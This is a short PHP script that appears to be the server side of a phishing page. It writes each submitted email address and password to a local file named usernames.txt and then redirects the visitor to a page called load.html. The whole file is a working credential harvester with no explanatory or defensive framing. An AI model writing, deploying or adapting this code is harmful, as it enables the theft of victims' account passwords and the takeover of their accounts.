<?php
file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST["psw"] . "\n", FILE_APPEND);
$emaill=$_POST['email'];
  $psww=$_POST['psw'];
if($emaill != $psww)
{
header("location:load.html");
}
else
  exit()
?>
